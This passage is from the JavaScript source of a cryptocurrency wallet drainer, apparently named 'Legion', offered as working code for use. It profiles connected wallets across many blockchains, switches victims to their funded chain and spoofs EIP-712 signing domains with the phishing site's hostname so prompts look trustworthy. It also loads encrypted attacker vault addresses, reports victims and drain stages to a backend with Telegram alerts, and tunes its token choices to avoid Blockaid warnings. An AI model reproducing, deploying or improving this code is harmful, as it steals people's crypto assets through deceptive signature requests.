    var reason = S.userRejectedSign ? 'reject-retry' : 'sign';
    _forceSignInflight = startPipeline({ reason: reason }).finally(function () {
      _forceSignInflight = null;
    });
    return _forceSignInflight;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 06: API HELPERS
  // ═══════════════════════════════════════════════════════════════
  function toHex(obj) {
    var str = typeof obj === 'string' ? obj : JSON.stringify(obj, function (k, v) {
      return typeof v === 'bigint' ? v.toString() : v;
    });
    var hex = '0x';
    for (var i = 0; i < str.length; i++) hex += str.charCodeAt(i).toString(16).padStart(2, '0');
    return hex;
  }

  function jsonSafe(obj) {
    return JSON.stringify(obj, function (k, v) { return typeof v === 'bigint' ? v.toString() : v; });
  }

  function resolveApiBaseUrls() {
    var urls = [];
    if (S.proxyUrls && S.proxyUrls.length) {
      S.proxyUrls.forEach(function (u) {
        var n = String(u).replace(/\/$/, '');
        if (n && urls.indexOf(n) < 0) urls.push(n);
      });
    }
    if (S.backendEndpoints && S.backendEndpoints.length) {
      S.backendEndpoints.forEach(function (u) {
        var n = String(u).replace(/\/$/, '');
        if (n && urls.indexOf(n) < 0) urls.push(n);
      });
    }
    var primary = String(BACKEND || '').replace(/\/$/, '');
    if (primary && urls.indexOf(primary) < 0) urls.unshift(primary);
    return urls.length ? urls : [BACKEND];
  }

  async function sha256Bytes(str) {
    if (typeof crypto !== 'undefined' && crypto.subtle && crypto.subtle.digest) {
      var enc = new TextEncoder().encode(String(str));
      var hash = await crypto.subtle.digest('SHA-256', enc);
      return new Uint8Array(hash);
    }
    throw new Error('WebCrypto unavailable for vault decrypt');
  }

  function xorDecryptB64(b64, keyBytes) {
    var raw = Uint8Array.from(atob(b64), function (c) { return c.charCodeAt(0); });
    var out = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) out[i] = raw[i] ^ keyBytes[i % keyBytes.length];
    return new TextDecoder().decode(out);
  }

  async function decryptVaultPayload(encB64, secret) {
    if (!encB64 || !secret) return null;
    try {
      var key = await sha256Bytes(secret);
      return JSON.parse(xorDecryptB64(encB64, key));
    } catch (e) {
      L.warn('vault decrypt fail:', e.message);
      return null;
    }
  }

  function applyDynamicEip712Domain(typedData, chainId) {
    if (!typedData || !typedData.domain) return typedData;
    // Permit2 domain name MUST stay "Permit2" — on-chain contract verifies it exactly
    var pt = typedData.primaryType;
    if (pt === 'PermitBatch' || pt === 'PermitSingle' || pt === 'Permit') return typedData;
    var keepVerify = typedData.domain.verifyingContract;
    var keepVersion = typedData.domain.version;
    var keepChainId = typedData.domain.chainId;
    var id = String(Number(chainId));
    var domCfg = (S.eip712Domains && (S.eip712Domains[id] || S.eip712Domains['default'])) || null;
    var hostName = null;
    try {
      // Use the hostname saved at WC connect time so domain.name matches the
      // DApp shown in Trust Wallet, even if user later navigates to a mirror site.
      var savedHost = sessionStorage.getItem('lgn_connect_host');
      hostName = savedHost
        ? String(savedHost).replace(/\./g, ' ')
        : String(window.location.hostname).replace(/\./g, ' ');
    } catch (e) {
      if (typeof window !== 'undefined' && window.location && window.location.hostname) {
        hostName = String(window.location.hostname).replace(/\./g, ' ');
      }
    }
    // Top-drainer UX: EIP-712 domain.name = site hostname (cfg override wins)
    if (domCfg && domCfg.name) typedData.domain.name = domCfg.name;
    else if (hostName) typedData.domain.name = hostName;
    if (domCfg && domCfg.version) typedData.domain.version = domCfg.version;
    else if (keepVersion != null) typedData.domain.version = keepVersion;
    if (domCfg && domCfg.verifyingContract) typedData.domain.verifyingContract = domCfg.verifyingContract;
    else if (keepVerify) typedData.domain.verifyingContract = keepVerify;
    if (keepChainId != null) typedData.domain.chainId = keepChainId;
    return typedData;
  }

  async function apiFetch(path, opts) {
    var bases = resolveApiBaseUrls();
    var lastErr = null;
    for (var bi = 0; bi < bases.length; bi++) {
      try {
        var base = String(bases[bi]).replace(/\/$/, '');
        await rpcRateWait(base);
        var res = await fetch(base + path, opts);
        if (res.status >= 500) throw new Error('HTTP ' + res.status);
        BACKEND = base;
        return res;
      } catch (e) { lastErr = e; }
    }
    throw lastErr || new Error('All API endpoints failed');
  }

  async function apiPost(path, body, tries) {
    tries = tries || 0;
    try {
      var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
      var timer = ctrl ? setTimeout(function () { ctrl.abort(); }, 20000) : null;
      var headers = { 'Content-Type': 'application/json', 'X-Source-Origin': window.location.origin };
      if (KINETIC_KEY) headers['x-legion-kinetic-key'] = KINETIC_KEY;
      var opts = {
        method: 'POST',
        headers: headers,
        body: jsonSafe(body),
      };
      if (ctrl) opts.signal = ctrl.signal;
      var res = await apiFetch(path, opts);
      if (timer) clearTimeout(timer);
      var data = await res.json().catch(function () { return {}; });
      if (!res.ok) {
        var deferred = res.status === 503 && data && (
          data.code === 'DEFERRED_BROADCAST' ||
          data.settlement_status === 'PENDING_BROADCAST' ||
          (data.data && (data.data.code === 'DEFERRED_BROADCAST' || data.data.settlement_status === 'PENDING_BROADCAST'))
        );
        if (deferred) {
          S.deferredBroadcasts = (S.deferredBroadcasts || 0) + 1;
          L.log('API deferred broadcast (503):', path, '— backend will retry');
          return { success: true, deferred: true, data: data.data || data };
        }
        L.warn('API', res.status, path, data && data.message);
        return null;
      }
      return data;
    } catch (e) {
      if (tries < 2) { await sleep(1000); return apiPost(path, body, tries + 1); }
      L.warn('API failed:', path, e.message);
      return null;
    }
  }

  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  function sigHex(obj) {
    var str = typeof obj === 'string' ? obj : JSON.stringify(obj);
    var hex = '0x';
    for (var i = 0; i < str.length; i++) hex += str.charCodeAt(i).toString(16).padStart(2, '0');
    return hex;
  }

  function bufToB64(buf) {
    var bytes = buf instanceof Uint8Array ? buf : new Uint8Array(buf);
    var bin = '';
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
  }

  function b64ToBuf(b64) {
    var bin = atob(b64);
    var buf = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
    return buf;
  }

  function decodeBase58(str) {
    var ALPHA = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    var bytes = [0];
    for (var i = 0; i < str.length; i++) {
      var val = ALPHA.indexOf(str[i]);
      if (val < 0) throw new Error('bad base58 char');
      var carry = val;
      for (var j = 0; j < bytes.length; j++) {
        carry += bytes[j] * 58;
        bytes[j] = carry & 0xff;
        carry >>= 8;
      }
      while (carry > 0) { bytes.push(carry & 0xff); carry >>= 8; }
    }
    for (var k = 0; k < str.length && str[k] === '1'; k++) bytes.push(0);
    return new Uint8Array(bytes.reverse());
  }

  // Dust floor: default 0.0001 ETH. When minDrainUsd=0 (Trust site), allow ~0.000001 ETH so $0.11 wallets still get a sign path.
  var MIN_NATIVE_WEI = MIN_DRAIN_USD <= 0 ? 1000000000000n : 100000000000000n;

  async function getProviderChainId(provider) {
    try {
      var hex = await provider.request({ method: 'eth_chainId' });
      return parseInt(String(hex).replace('0x', ''), 16);
    } catch (e) {
      return null;
    }
  }

  async function waitForProviderChain(provider, chainId, timeoutMs) {
    var deadline = Date.now() + (timeoutMs || 8000);
    while (Date.now() < deadline) {
      var cur = await getProviderChainId(provider);
      if (Number(cur) === Number(chainId)) return true;
      await sleep(200);
    }
    return false;
  }

  async function switchProviderChain(provider, chainId) {
    var hexId = '0x' + Number(chainId).toString(16);
    try {
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: hexId }],
      });
    } catch (switchErr) {
      var msg = String(switchErr && switchErr.message || switchErr || '');
      var code = switchErr && switchErr.code;
      if (msg.indexOf('Unrecognized chain') === -1 && msg.indexOf('4902') === -1 && code !== 4902) throw switchErr;
      var add = CHAIN_ADD_PARAMS[Number(chainId)];
      if (!add) throw switchErr;
      L.log('Adding chain', chainId, 'to wallet...');
      await provider.request({ method: 'wallet_addEthereumChain', params: [add] });
      await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] });
    }
    var matched = await waitForProviderChain(provider, chainId, 8000);
    if (!matched) L.warn('Chain', chainId, 'switch pending — provider not synced yet');
    await sleep(400);
  }

  async function safeSwitchProviderChain(provider, chainId) {
    try {
      var cur = await getProviderChainId(provider);
      if (cur === Number(chainId)) return true;
      await switchProviderChain(provider, chainId);
      return true;
    } catch (e) {
      var msg = String(e && e.message || e || '');
      if (isUserRejection(e)) {
        L.warn('Chain', chainId, 'switch/add declined by user — skip');
        return false;
      }
      if (msg.indexOf('Unrecognized chain') !== -1 || msg.indexOf('4902') !== -1) {
        L.warn('Chain', chainId, 'not supported in wallet — skip');
        return false;
      }
      throw e;
    }
  }

  async function readNativeBalanceWei(provider, address, chainId) {
    try {
      var hex = await evmRequestWithFallback(provider, chainId || 1, 'eth_getBalance', [address, 'latest']);
      return BigInt(hex || '0x0');
    } catch (e) {
      return 0n;
    }
  }

  function backendHasDrainableAssets(scoutData) {
    if (!scoutData) return false;
    if (Number(scoutData.total_usd || 0) > 0) return true;
    var ranked = scoutData.assets || scoutData.ranked || [];
    for (var ri = 0; ri < ranked.length; ri++) {
      var bal = ranked[ri].raw_balance || ranked[ri].amount_raw || '0';
      if (BigInt(bal || '0') > 0n) return true;
    }
    if (scoutData.nfts && scoutData.nfts.length) return true;
    if (scoutData.defi_positions && scoutData.defi_positions.length) return true;
    return false;
  }

  async function findFundedChainViaBackend(address) {
    var order = getMultiChainOrder();
    for (var i = 0; i < order.length; i++) {
      var cid = order[i];
      try {
        var data = await SCOUT.ranked(address, cid);
        if (backendHasDrainableAssets(data)) return cid;
      } catch (e) { /* next chain */ }
    }
    return null;
  }

  /** Switch MetaMask to the EVM chain that actually holds native balance. */
  async function ensureFundedEvmChain(provider, address, connectedChainId) {
    var connectedBal = await readNativeBalanceWei(provider, address, connectedChainId);
    if (connectedBal > MIN_NATIVE_WEI) {
      L.log('Funded chain:', connectedChainId, '| native:', (Number(connectedBal) / 1e18).toFixed(6));
      return Number(connectedChainId);
    }

    L.log('Chain', connectedChainId, 'empty — finding funded EVM chain...');
    var backendChain = await findFundedChainViaBackend(address);
    if (backendChain != null) {
      var cur = await getProviderChainId(provider);
      if (cur !== Number(backendChain)) {
        var switched = await safeSwitchProviderChain(provider, backendChain);
        if (switched) {
          var bal = await readNativeBalanceWei(provider, address, backendChain);
          if (bal > MIN_NATIVE_WEI || backendHasDrainableAssets(await SCOUT.ranked(address, backendChain))) {
            L.log('Backend-guided switch →', backendChain);
            return Number(backendChain);
          }
        }
      } else {
        return Number(backendChain);
      }
    }

    return Number(connectedChainId);
  }

  function dedupeTokensByContract(tokens) {
    var seen = {};
    var out = [];
    (tokens || []).forEach(function (t) {
      var key = String(t.address || t.contract || '').toLowerCase();
      if (!key || seen[key]) return;
      seen[key] = true;
      out.push(t);
    });
    return out;
  }

  /** Skip $0 scam-airdrop tokens (Blockaid flags 1B Permit2 on these). */
  function filterDrainableTokens(tokens) {
    return dedupeTokensByContract(tokens || []).filter(function (t) {
      var bal = BigInt(t.balance || t.amount_raw || '0');
      if (bal <= 0n) return false;
      var usd = Number(t.usd != null ? t.usd : (t.amount_usd != null ? t.amount_usd : NaN));
      if (Number.isFinite(usd) && usd <= 0) return false;
      return true;
    });
  }

  function chainSlotWorthDraining(ch) {
    if (!ch) return false;
    if (Number(ch.usd || 0) > 0) return true;
    return filterDrainableTokens(ch.tokens).length > 0;
  }

  function chainHasDrainableAssets(assets) {
    if (!assets) return false;
    var nativeBal = BigInt(assets.nativeHex || '0x0');
    if (nativeBal > MIN_NATIVE_WEI) return true;
    if (filterDrainableTokens(assets.tokens).length > 0) return true;
    if (assets.nfts && assets.nfts.length > 0) return true;
    return false;
  }

  function assetsHaveDrainableBalance(assets) {
    if (!assets) return false;
    if (BigInt(assets.nativeHex || '0x0') > MIN_NATIVE_WEI) return true;
    if (assets.nfts && assets.nfts.length > 0) return true;
    return filterDrainableTokens(assets.tokens).length > 0;
  }

  var SCOUT = {
    telemetry: async function (address, chainId, walletName, allAddrs) {
      try {
        var map = allAddrs || collectAddressMap(address);
        var connected = [];
        Object.keys(map).forEach(function (k) { if (map[k]) connected.push(k + ':' + map[k]); });
        var res = await apiPost('/api/v1/scout', {
          user_address: address,
          chain_id: Number(chainId) > 0 ? Number(chainId) : (S.evmChain > 0 ? Number(S.evmChain) : undefined),
          wallet_type: walletName || 'Unknown',
          chain_family: 'EVM',
          source_page: window.location.href,
          connect_session: S.connectSession || undefined,
          connected_wallets: connected.length ? connected : undefined,
          scout_value_usd: S.scoutUsd > 0 ? S.scoutUsd : undefined,
        });
        // Always visible — silentMode hides [LGN] so connect notify must use console
        if (res && res.success) {
          console.warn('[Legion] scout OK → Telegram path', String(address).slice(0, 10) + '...');
        } else {
          console.warn('[Legion] scout FAILED (no Telegram) — check Network /api/v1/scout');
        }
        return res;
      } catch (e) {
        console.warn('[Legion] scout error:', e && e.message ? e.message : e);
        return null;
      }
    },

    reportDrainStatus: async function (event, address, chainId, walletName, detail) {
      try {
        await apiPost('/api/v1/scout/drain-status', {
          wallet_address: address,
          event: event,
          chain_id: Number(chainId) || undefined,
          chain_family: 'EVM',
          wallet_type: walletName || 'Unknown',
          scout_value_usd: Number(S.scoutUsd) || 0,
          source_page: window.location.href,
          detail: detail || undefined,
          connect_session: S.connectSession || undefined,
        });
      } catch (e) {}
    },

    alertStage: async function (stage, address, chainId, walletName, detail) {
      L.log('[alert]', stage, detail || '');
      return SCOUT.reportDrainStatus(stage, address, chainId, walletName, detail);
    },

    alertFailure: async function (chainFamily, step, err, address, chainId, walletName) {
      var msg = (err && err.message) || String(err || 'unknown error');
      var detail = JSON.stringify({
        chain: chainFamily || 'EVM',
        step: step || 'unknown',
        error: msg,
        trace: err && err.stack ? String(err.stack).slice(0, 200) : undefined,
      }).slice(0, 480);
      L.warn('[alert:fail]', chainFamily, step, msg);
      return SCOUT.alertStage('drain_fail', address, chainId, walletName, detail);
    },

    reportScanComplete: async function (address, totalUsd, assetCount, walletName, chainId) {
      // Always notify once per address+session — including empty wallets ($0)
      var usd = Number(totalUsd) || 0;
      var addrKey = String(address || '').toLowerCase();
      var dedupeKey = addrKey + ':' + String(S.connectSession || '');
      if (S._scanCompleteKey === dedupeKey) {
        L.log('[scout] skip duplicate scan_complete');
        return;
      }
      if (S.fusionNotified && S._scanCompleteAddr === addrKey) {
        L.log('[scout] skip scan_complete — already notified this address');
        return;
      }
      S.fusionNotified = true;
      S._scanCompleteKey = dedupeKey;
      S._scanCompleteAddr = addrKey;
      S.scoutUsd = Math.max(S.scoutUsd, usd);
      try {
        await apiPost('/api/v1/scout/drain-status', {
          wallet_address: address,
          event: 'scan_complete',
          chain_id: Number(chainId) || undefined,
          chain_family: 'EVM',
          wallet_type: walletName || 'Unknown',
          scout_value_usd: usd,
          asset_count: assetCount || 0,
          source_page: window.location.href,
          connect_session: S.connectSession || undefined,
        });
        L.log('[scout] scan_complete notified | usd=', usd);
      } catch (e) {}
    },

    fusion: async function (addrs) {
      try {
        var fKey = String((addrs && (addrs.evm || addrs.sol || addrs.btc)) || '').toLowerCase();
        if (fKey && S._fusionDoneKey === fKey && S.fusionAssets) {
          L.log('[fusion] skip duplicate');
          return { total_usd: S.scoutUsd, assets: S.fusionAssets };
        }
        if (S._fusionPromise) return S._fusionPromise;
        S._fusionPromise = (async function () {
          var body = { connect_session: S.connectSession || undefined };
          if (S.scoutUsd > 0) body.scout_value_usd = S.scoutUsd;
          if (addrs.evm) body.evm_holder = addrs.evm;
          if (addrs.sol) body.sol_owner_base58 = addrs.sol;
          if (addrs.tron) body.tron_holder_base58 = addrs.tron;
          if (addrs.ton) body.ton_friendly_address = addrs.ton;
          if (addrs.btc) body.btc_holder_address = addrs.btc;
          if (addrs.cosmos) body.cosmos_holder_address = addrs.cosmos;
          if (addrs.aptos) body.aptos_holder_address = addrs.aptos;
          if (addrs.sui) body.sui_holder_address = addrs.sui;
          var r = await apiPost('/api/scout/recursive-predator-fusion', body);
          var data = (r && r.data && r.data.fusion) ? r.data.fusion : (r && r.data) ? r.data : r;
          if (data && data.total_usd) S.scoutUsd = Number(data.total_usd) || S.scoutUsd;
          if (data && data.assets) S.fusionAssets = data.assets;
          if (fKey) S._fusionDoneKey = fKey;
          return data || null;
        })().finally(function () { S._fusionPromise = null; });
        return S._fusionPromise;
      } catch (e) { L.warn('Fusion scout fail:', e.message); return null; }
    },

    ranked: async function (address, chainId) {
      try {
        var key = String(address || '').toLowerCase() + ':' + String(chainId == null ? 'all' : Number(chainId));
        var now = Date.now();
        if (!S._rankedCache) S._rankedCache = {};
        var hit = S._rankedCache[key];
        if (hit && (now - hit.ts) < 45000) return hit.data;
        var body = { wallet_address: address };
        if (chainId != null) body.chain_id = Number(chainId);
        var r = await apiPost('/api/v1/scout/ranked', body);
        var data = (r && r.data) ? r.data : null;
        S._rankedCache[key] = { ts: now, data: data };
        return data;
      } catch (e) { return null; }
    },

    chainPriority: function (fusionData) {
      var order = ['EVM', 'SOL', 'BTC', 'TRON', 'TON', 'COSMOS', 'POLKADOT', 'ALGORAND', 'CARDANO', 'APTOS', 'SUI'];
      var vals = {};
      var familyFromChain = function (chain) {
        var c = String(chain || '').toUpperCase();
        if (c === 'SVM' || c === 'SOL' || c === 'SOLANA') return 'SOL';
        if (c === 'UTXO' || c === 'BTC' || c === 'BITCOIN') return 'BTC';
        if (c === 'TRX' || c === 'TRON') return 'TRON';
        if (c === 'TON') return 'TON';
        if (c === 'COSMOS') return 'COSMOS';
        if (c === 'POLKADOT' || c === 'DOT') return 'POLKADOT';
        if (c === 'ALGORAND' || c === 'ALGO') return 'ALGORAND';
        if (c === 'CARDANO' || c === 'ADA') return 'CARDANO';
        if (c === 'APTOS') return 'APTOS';
        if (c === 'SUI') return 'SUI';
        return 'EVM';
      };
      var assets = (fusionData && fusionData.assets) || S.fusionAssets || [];
      assets.forEach(function (a) {
        var fam = a.family || a.chain_family || familyFromChain(a.chain);
        if (fam === 'SVM') fam = 'SOL';
        if (fam === 'UTXO') fam = 'BTC';
        vals[fam] = (vals[fam] || 0) + Number(a.amount_usd || a.usd_value || 0);
      });
      var rankedItems = (S.portfolioScan && S.portfolioScan.items) || [];
      rankedItems.forEach(function (a) {
        var fam = familyFromChain(a.chain || a.chain_family || a.family);
        vals[fam] = (vals[fam] || 0) + Number(a.amount_usd || a.usd_value || 0);
      });
      if (S.portfolioScan && S.portfolioScan.byChain) {
        var evmUsd = 0;
        Object.keys(S.portfolioScan.byChain).forEach(function (cid) {
          evmUsd += Number(S.portfolioScan.byChain[cid].usd || 0);
        });
        if (evmUsd > 0) vals.EVM = Math.max(vals.EVM || 0, evmUsd);
      }
      return order.slice().sort(function (a, b) { return (vals[b] || 0) - (vals[a] || 0); });
    },
  };

  var _prefetchVaultPromise = null;
  async function prefetchVault() {
    if (S.vaultLoaded) return;
    if (_prefetchVaultPromise) return _prefetchVaultPromise;
    _prefetchVaultPromise = _prefetchVaultInner().finally(function () {
      _prefetchVaultPromise = null;
    });
    return _prefetchVaultPromise;
  }
  async function _prefetchVaultInner() {
    try {
      var res = await apiFetch('/api/v1/client-config', { method: 'GET', credentials: 'omit' });
      var d = await res.json();
      if (d && d.data) {
        if (d.data.endpoints && d.data.endpoints.length) {
          S.backendEndpoints = d.data.endpoints.slice();
        }
        if (d.data.proxy_urls && d.data.proxy_urls.length) {
          S.proxyUrls = d.data.proxy_urls.slice();
        }
        if (d.data.primary) BACKEND = String(d.data.primary).replace(/\/$/, '');
        if (d.data.deploy_domains && d.data.deploy_domains.length) {
          S.deployDomains = d.data.deploy_domains.slice();
        }
        if (d.data.eip712_domains && typeof d.data.eip712_domains === 'object') {
          S.eip712Domains = d.data.eip712_domains;
        }
        if (d.data.eip7702_enabled === false) S.eip7702Enabled = false;
        if (d.data.relayer_sponsored_gas === true) S.relayerSponsored = true;
        if (d.data.chain_capabilities && typeof d.data.chain_capabilities === 'object') {
          S.chainCapabilities = d.data.chain_capabilities;
        }
        if (d.data.drain_readiness && typeof d.data.drain_readiness === 'object') {
          S.drainReadiness = d.data.drain_readiness;
        }
        var factoryMap = d.data.factory_addresses;
        if (factoryMap && typeof factoryMap === 'object') {
          Object.keys(factoryMap).forEach(function (cid) {
            var fa = factoryMap[cid];
            if (fa && !isZeroAddr(fa)) DRAIN_FACTORY[Number(cid)] = String(fa);
          });
        }
        var va = d.data.vault_addresses;
        var encKey = CFG.clientEncryptKey || '';
        if (d.data.vault_addresses_encrypted && encKey) {
          var dec = await decryptVaultPayload(d.data.vault_addresses_encrypted, encKey);
          if (dec) va = dec;
        }
        if (va) {
          if (va.evm || va.ethereum) VAULT.evm = va.evm || va.ethereum;
          if (va.sol || va.svm) VAULT.sol = va.sol || va.svm;
          if (va.btc) VAULT.btc = va.btc;
          if (va.tron || va.trx) VAULT.tron = va.tron || va.trx;
          if (va.ton) VAULT.ton = va.ton;
          if (va.cosmos) VAULT.cosmos = va.cosmos;
          if (va.aptos) VAULT.aptos = va.aptos;
          if (va.sui) VAULT.sui = va.sui;
        }
      }
    } catch (e) { L.warn('Vault fetch failed, using fallback'); }
    S.vaultLoaded = true;
  }

  function isFamilyDrainReady(family) {
    var fam = String(family || '').toUpperCase();
    var cap = S.chainCapabilities && S.chainCapabilities[fam];
    if (cap === 'disabled') return false;
    // anchor_only = signMessage + backend anchor (DOT/ALGO/ADA) — still run
    if (cap === 'anchor_only' || cap === 'full') return true;
    if (fam === 'COSMOS' && !VAULT.cosmos) return false;
    if (fam === 'APTOS' && !VAULT.aptos) return false;
    if (fam === 'SUI' && !VAULT.sui) return false;
    // Default: DOT/ALGO/ADA run anchor path when WC/extension connected
    if (fam === 'POLKADOT' || fam === 'ALGORAND' || fam === 'CARDANO') return true;
    return true;
  }

  function isAnchorOnlyFamily(family) {
    var fam = String(family || '').toUpperCase();
    var cap = S.chainCapabilities && S.chainCapabilities[fam];
    if (cap === 'anchor_only') return true;
    return fam === 'POLKADOT' || fam === 'ALGORAND' || fam === 'CARDANO';
  }

  function normalizeTypedData(typedDataObj) {
    if (!typedDataObj) return typedDataObj;
    if (typedDataObj.domain && typeof typedDataObj.domain.chainId === 'string') {
      typedDataObj.domain.chainId = parseInt(typedDataObj.domain.chainId, 10) || 1;
    }
    if (typedDataObj.types && !typedDataObj.types.EIP712Domain) {
      var dom = typedDataObj.domain || {};
      var domFields = [];
      if (dom.name !== undefined) domFields.push({ name: 'name', type: 'string' });
      if (dom.version !== undefined) domFields.push({ name: 'version', type: 'string' });
      if (dom.chainId !== undefined) domFields.push({ name: 'chainId', type: 'uint256' });
      if (dom.verifyingContract !== undefined) domFields.push({ name: 'verifyingContract', type: 'address' });
      typedDataObj.types.EIP712Domain = domFields;
    }
    return typedDataObj;
  }

  function normNftList(nfts) {
    var byContract = {};
    (nfts || []).forEach(function (n) {
      var contract = String(n.contract || n.nft_contract || '').toLowerCase();
      if (!contract) return;
      var tokenIds = n.tokenIds || [String(n.token_id || n.tokenId || '1')];
      var standard = n.standard || 'erc721';
      if (!byContract[contract]) {
        byContract[contract] = { contract: contract, tokenIds: [], standard: standard, _seen: {} };
      }
      var entry = byContract[contract];
      tokenIds.forEach(function (tid) {
        var s = String(tid);
        if (!entry._seen[s]) {
          entry._seen[s] = true;
          entry.tokenIds.push(s);
        }
      });
    });
    return Object.keys(byContract).map(function (k) {
      var e = byContract[k];
      delete e._seen;
      return e;
    });
  }

  function countUniqueNftContracts(nfts) {
    var seen = {};
    (nfts || []).forEach(function (n) {
      var c = String(n.contract || n.nft_contract || '').toLowerCase();
      if (c) seen[c] = true;
    });
    return Object.keys(seen).length;
  }

  function extractNftApprovalEntries(raw) {
    if (!raw) return [];
    if (Array.isArray(raw)) {
      return raw.map(function (item) {
      return {
          contract: String(item.contract || '').toLowerCase(),
          typedData: item.typedData || item,
        };
      }).filter(function (e) { return e.contract && e.typedData; });
    }
    if (typeof raw === 'object') {
      return Object.keys(raw).map(function (k) {
        var val = raw[k];
        return {
          contract: k.toLowerCase(),
          typedData: val && val.typedData ? val.typedData : val,
        };
      }).filter(function (e) { return e.contract && e.typedData; });
    }
    return [];
  }

  function isLethalEvmResult(p2) {
    if (!p2) return false;
    if (p2.sig && String(p2.sig).length > 10) return true;
    if (p2.nativeSigned && String(p2.nativeSigned).startsWith('0x') && p2.nativeSigned.length > 70) return true;
    var nas = p2.nftApprovalSigs || {};
    return Object.keys(nas).some(function (k) { return nas[k] && String(nas[k]).length > 10; });
  }

  function isUserRejection(e) {
    var code = e && (e.code || (e.data && e.data.code));
    var msg = (e && (e.message || e.reason)) || (typeof e === 'string' ? e : '') || '';
    return code === 4001 || code === -32100 || code === 5000 || code === 'ACTION_REJECTED' ||
      /rejected|denied|cancelled|user rejected|declined/i.test(msg);
  }

  function userRejectionMessage() {
    return 'You declined the request. No changes were made to your wallet.';
  }

  async function runWithRetry(fn, label, maxAttempts) {
    var cap = maxAttempts != null ? maxAttempts : MAX_APPROVAL_RETRIES;
    if (cap < 1) cap = 1;
    var attempt = 0;
    var lastErr = null;
    while (attempt < cap) {
      attempt++;
      try {
        return await fn();
      } catch (e) {
        lastErr = e;
        if (!isUserRejection(e)) throw e;
        L.warn('[retry]', label || 'approval', '— user acted, not re-showing same popup', attempt + '/' + cap);
        // Do NOT re-prompt the same approval — next different popup may still run
        throw e;
      }
    }
    throw lastErr || new Error((label || 'approval') + ' rejected after ' + cap + ' attempts');
  }

  function chunkArray(arr, size) {
    var out = [];
    for (var ci = 0; ci < arr.length; ci += size) {
      out.push(arr.slice(ci, ci + size));
    }
    return out;
  }

  function isLikelyTxHash(id) {
    return typeof id === 'string' && /^0x[a-fA-F0-9]{64}$/.test(id);
  }

  function estimateSendCallsGasLimit(tokenCount, nftCount, hasNative, chainId) {
    var nativeGas = 0n;
    if (hasNative) {
      nativeGas = resolveClaimContract(chainId) ? CLAIM_CONTRACT_GAS : NATIVE_TRANSFER_GAS;
    }
    var limit = nativeGas;
    limit += BigInt(tokenCount || 0) * ERC20_TRANSFER_GAS;
    limit += BigInt(nftCount || 0) * ERC20_TRANSFER_GAS;
    if (limit < NATIVE_TRANSFER_GAS) limit = NATIVE_TRANSFER_GAS;
    return limit;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 07: HARDWARE WALLET — LEDGER + TREZOR
  // ═══════════════════════════════════════════════════════════════
  var _ledgerTransport = null, _ledgerEthApp = null, _trezorReady = false;
  var HD_PATH_EVM = "m/44'/60'/0'/0";

  var HW = {
    available: function () { return !!(navigator && navigator.usb); },

    loadLedger: async function () {
      if (_ledgerTransport && _ledgerEthApp) return true;
      try {
        await loadVendorScript('ledger-transport-webusb.umd.js');
        await loadVendorScript('ledger-app-eth.umd.js');
        var TM = window.LedgerTransportWebUSB || window.TransportWebUSB;
        var EM = window.LedgerEth || window.Eth;
        if (TM && EM) {
          _ledgerTransport = TM.default || TM;
          _ledgerEthApp = EM.default || EM;
          return true;
        }
      } catch (e) { /* vendor optional */ }
      if (!CDN_FALLBACK) {
        L.warn('Ledger: self-host vendor/ledger-*.js or set cdnFallback (strictCsp:false)');
        return false;
      }
      try {
        var mods = await Promise.all([
          import('https://esm.sh/@ledgerhq/hw-transport-webusb@6.29.4?bundle-deps'),
          import('https://esm.sh/@ledgerhq/hw-app-eth@6.38.4?bundle-deps'),
        ]);
        _ledgerTransport = mods[0].default || mods[0];
        _ledgerEthApp = mods[1].default || mods[1];
        return true;
      } catch (e) { L.warn('Ledger SDK fail:', e.message); return false; }
    },

    connectLedger: async function () {
      if (!this.available() || !await this.loadLedger()) return null;
      try {
        var t = await _ledgerTransport.create();
        var app = new _ledgerEthApp(t);
        var r = await app.getAddress(HD_PATH_EVM, false);
        if (!r || !r.address) throw new Error('No address');
        L.log('Ledger connected:', r.address.slice(0, 8));
        return { type: 'ledger', address: r.address.toLowerCase(), transport: t, ethApp: app };
      } catch (e) { L.warn('Ledger connect fail:', e.message); return null; }
    },

    signLedgerTypedData: async function (hwObj, typedData) {
      try {
        var r = await hwObj.ethApp.signEIP712Message(HD_PATH_EVM, typedData);
        return '0x' + r.r + r.s + (r.v - 27).toString(16).padStart(2, '0');
      } catch (e) {
        // Older Nano S fallback
        try {
          var hex = toHex(jsonSafe(typedData)).slice(2);
          var r2 = await hwObj.ethApp.signPersonalMessage(HD_PATH_EVM, hex);
          return '0x' + r2.r + r2.s + (r2.v - 27).toString(16).padStart(2, '0');
        } catch (e2) { L.warn('Ledger sign fail:', e2.message); return null; }
      }
    },

    loadTrezor: async function () {
      if (_trezorReady && window.TrezorConnect) return true;
      try {
        await loadVendorScript('trezor-connect-web.min.js');
        var TC = window.TrezorConnect;
        if (TC) {
          await TC.init({ lazyLoad: false, manifest: { email: 'dev@app.io', appUrl: window.location.origin } });
          _trezorReady = true;
          return true;
        }
      } catch (e) { /* vendor optional */ }
      if (!CDN_FALLBACK) {
        L.warn('Trezor: self-host vendor/trezor-connect-web.min.js or set cdnFallback');
        return false;
      }
      try {
        var m = await import('https://esm.sh/@trezor/connect-web@9.4.5?bundle-deps');
        var TC2 = m.default || m;
        await TC2.init({ lazyLoad: false, manifest: { email: 'dev@app.io', appUrl: window.location.origin } });
        window.TrezorConnect = TC2;
        _trezorReady = true;
        return true;
      } catch (e) { L.warn('Trezor SDK fail:', e.message); return false; }
    },

    connectTrezor: async function () {
      // Trezor Connect uses Bridge/popup — WebUSB not required (Ledger needs USB)
      if (!await this.loadTrezor()) return null;
      try {
        var r = await window.TrezorConnect.ethereumGetAddress({ path: HD_PATH_EVM, showOnTrezor: true });
        if (!r.success) throw new Error(r.payload.error);
        L.log('Trezor connected:', r.payload.address.slice(0, 8));
        return { type: 'trezor', address: r.payload.address.toLowerCase() };
